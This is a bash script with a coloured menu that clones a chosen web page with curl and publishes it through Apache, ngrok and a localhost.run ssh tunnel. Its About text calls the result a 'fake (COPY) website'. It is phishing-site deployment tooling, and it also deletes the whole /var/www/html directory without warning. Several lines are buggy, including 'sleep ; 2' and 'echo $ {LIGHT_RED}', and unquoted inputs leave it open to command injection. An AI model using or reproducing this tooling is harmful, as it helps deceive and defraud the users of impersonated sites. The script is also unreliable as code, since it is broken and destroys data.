#!/usr/bin/bash

#Color values
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'
LIGHT_YELLOW='\e[93m'
LIGHT_CYAN='\033[1;36m'
LIGHT_GRAY='\033[0;37m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
LIGHT_BLUE='\033[1;34m'
LIGHT_PURPLE='\033[1;35m'

#MAIN LOOP START
while true 
do 

#Clearing screen
clear

#Function Logo
function_logo () {
echo -e ${LIGHT_GRAY}"
───────────────────────${LIGHT_CYAN}▄██▄▄██▄${LIGHT_GRAY}─────────────────────────
──────────────────────${LIGHT_CYAN}██████████${LIGHT_GRAY}────────────────────────
──────────────────────${LIGHT_CYAN}▀████████▀${LIGHT_GRAY}────────────────────────
────────────────────────${LIGHT_CYAN}▀████▀${LIGHT_GRAY}──────────────────────────
─────────────────────────${LIGHT_CYAN}████${LIGHT_GRAY}───────────────────────────
─────────────────────────${LIGHT_CYAN}████${LIGHT_GRAY}───────────────────────────
─────────────────────────${LIGHT_CYAN}████${LIGHT_GRAY}─────────────────────────── 

${LIGHT_RED}            ╭━━━╮╭╮╱╱╱╱╱╱${LIGHT_PURPLE}╭━╮╭━┳━━━╮${LIGHT_RED}
            ┃╭━╮┣╯╰╮╱╱╱╱╱${LIGHT_PURPLE}┃┃╰╯┃┃╭━╮┃${LIGHT_RED}   
            ┃╰━━╋╮╭╋━━╮╱╱${LIGHT_PURPLE}┃╭╮╭╮┃┃╱┃┣━━╮${LIGHT_RED}  
            ╰━━╮┣┫┃┃┃━╋━━${LIGHT_PURPLE}┃┫┃┃┃┃┃╰━╯┃╭╮┃${LIGHT_RED}
            ┃╰━╯┃┃╰┫┃━╋━━${LIGHT_PURPLE}┫┃┃┃┃┃╭━╮┃╰╯┃${LIGHT_RED}
            ╰━━━┻┻━┻━━╯╱╱${LIGHT_PURPLE}╰╯╰╯╰┻╯╱╰┫╭━╯${LIGHT_RED}
            ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃
${LIGHT_GRAY}
${LIGHT_BLUE}Author - Anil Shrestha   ${LIGHT_CYAN}████ ${LIGHT_BLUE} Cold Bones (Being Cold) ${LIGHT_GRAY}
──────────────────────${LIGHT_CYAN}▄▄▄████${LIGHT_GRAY}───────────────────────────
──────────────────────${LIGHT_CYAN}▀▀▀████${LIGHT_GRAY}───────────────────────────
──────────────────────${LIGHT_CYAN}▀▀▀████${LIGHT_GRAY}───────────────────────────
──────────────────────${LIGHT_CYAN}▀▀▀████${LIGHT_GRAY}───────────────────────────
──────────────────────${LIGHT_CYAN}▄█████▀${LIGHT_GRAY}───────────────────────────
" 
}

#Calling function logo
function_logo

#Options
echo -e ${LIGHT_YELLOW}"\n
( 1 ) >>> Clone a website page 
${LIGHT_GREEN}
( 2 ) >>> Deploy your website over WANT 
${LIGHT_RED}
( 3 ) >>> About 
${LIGHT_PURPLE}
( 99 ) >>> EXit
"
echo -e ${LIGHT_CYAN} ; read -p " Cold_Bones >>>   " choosing_option

# MAIN IF START
# CLone Website
if [ $choosing_option == 1 ]
then
clear ; function_logo
echo -e ${LIGHT_GRAY}
echo " 
█▀▀ █░░ █▀█ █▄░█ █▀▀   ▄▄   █░█░█ █▀▀ █▄▄ █▀ █ ▀█▀ █▀▀
█▄▄ █▄▄ █▄█ █░▀█ ██▄   ░░   ▀▄▀▄▀ ██▄ █▄█ ▄█ █ ░█░ ██▄
" ; echo -e  ${LIGHT_CYAN}
read -p "Full URL of website ( Type the URL for best result ) >>> " clone_site ; echo -e  ${LIGHT_RED} 
read -p "With what name you want to save it ( without extension ) ? >>> " saving_site_name ; echo -e  ${LIGHT_BLUE} 

str="Cloning the website..."
for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
done ; curl $clone_site -o $saving_site_name.html 
echo ; echo -e ${LIGHT_CYAN} "Website saved in $PWD/$saving_site_name.html"
while true 
do
echo -e  ${LIGHT_RED} ; read -p "Do you want to deploy this website over Internet (Y/N) ? " deploy
    if [ $deploy == Y ]
    then 
    echo -e ${MAGENTA} 
    ifconfig ; echo -e ${LIGHT_RED} ; read -p "Please provide your inet Adress >>> " localhost
    #Sending the website to the var/www/html
    echo ; str="Sending your files to /var/ww/html"  ; 
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}" 
    sleep 0.1 
    done ; rm -rf /var/www/html ; mkdir /var/www/html ; cp $PWD/$saving_site_name.html /var/www/html ; sleep 2
    #Chaning name of actual file to index.html
    mv /var/www/html/$saving_site_name.html /var/www/html/index.html
    echo -e "\n" 
    #Deploying it over Localhost and WANT
    str="Deploying the website over WAN..." 
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
    done ; service apache2 start ; sleep 2 ; xdg-open http://$localhost/ ; sleep 2 ; gnome-terminal -- sh -c 'ngrok http http://localhost/; $SHELL' 
    gnome-terminal -- sh -c 'ssh -R 80:localhost:80 nokey@localhost.run; $SHELL'  
    #Closing
    echo -e "\n" ; echo -e "Press enter to close it..." ; read
    str="Closing your website..." 
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
    done ; service apache2 stop ; rm /var/www/html/index.html ; echo -e ${LIGHT_CYAN} 
    echo
    str="Thankyou for using..." 
    for ((i=0; i<${#str}; i++)); do
    echo -n "${str:$i:1}"
    sleep 0.1
    done ; sleep ; 2 ; break ; 
    #Closed
    elif [ $deploy == N ]
    then
    break
    else
    echo 
    echo $ {LIGHT_RED} " Please choose valid option..." ; read
    fi
    done

# Deploy your Website
elif [ $choosing_option == 2 ]
then 
clear ; function_logo
echo -e ${LIGHT_GRAY}
echo " 
█▀▄ █▀▀ █▀█ █░░ █▀█ █▄█ ▄▄ █░█░█ █▀▀ █▄▄ █▀ █ ▀█▀ █▀▀
█▄▀ ██▄ █▀▀ █▄▄ █▄█ ░█░ ░░ ▀▄▀▄▀ ██▄ █▄█ ▄█ █ ░█░ ██▄
" 
while true
do
echo -e ${MAGENTA} 
ifconfig ; echo -e ${LIGHT_RED} ; read -p "Please provide your inet Adress >>> " localhost
echo -e ${LIGHT_RED} ; read -p "Name of your page ( without extension ) >>> " saving_site_name
echo -e ${LIGHT_RED} ; read -p "Full path of the page ( /home/path ) >>> " site_path
#Sending the website to the var/www/html
echo ; str="Sending your page to /var/ww/html" 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; rm -rf /var/www/html ; mkdir /var/www/html ; cp $site_path/$saving_site_name.html /var/www/html ; sleep 2
#Chaning name of actual file to index.html
mv /var/www/html/$saving_site_name.html /var/www/html/index.html
echo -e "\n" 
#Deploying it over Localhost and WANT
str="Deploying the website over WAN..." 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; service apache2 start ; sleep 2 ; xdg-open http://$localhost/ ; sleep 2 ; gnome-terminal -- sh -c 'ngrok http http://localhost/; $SHELL' 
gnome-terminal -- sh -c 'ssh -R 80:localhost:80 nokey@localhost.run; $SHELL' 
#Closing
echo -e "\n" ; echo -e "Press enter to close it..." ; read
str="Closing your website..." 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; service apache2 stop ; rm /var/www/html/index.html ; echo -e ${LIGHT_CYAN} 
echo
str="Thankyou for using..." ; 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; sleep 2
break
done 

# About 
elif [ $choosing_option == 3 ]
then 
clear ; function_logo
echo -e ${LIGHT_GRAY} "
▄▀█ █▄▄ █▀█ █░█ ▀█▀ 
█▀█ █▄█ █▄█ █▄█ ░█░  
" 
echo -e ${LIGHT_RED} "
Hello I am Anil Shrestha ( Cold Bones )
This tool is a very powerfull tool which provides you the ability to deploy very similar 
fake ( COPY ) website to the INTERNET. Please don't use this for any malecious purposes...

Author - Anil Shrestha ( Cold Bones )
Github - https://github.com/ColdBones69
Facebook - https://www.facebook.com/secrets.1928

Thankyou for using it...
" ; read 

# Exiting
elif [ $choosing_option == 99 ] 
then
clear
function_logo ; echo -e ${LIGHT_CYAN}
str="Thankyou for using..." ; 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; sleep 1 ; break

else
echo -e ${LIGHT_RED}
str="Please choose valid option" ; 
for ((i=0; i<${#str}; i++)); do
echo -n "${str:$i:1}"
sleep 0.1
done ; sleep 1

#MAIN IF END
fi
#MAIN LOOP END
done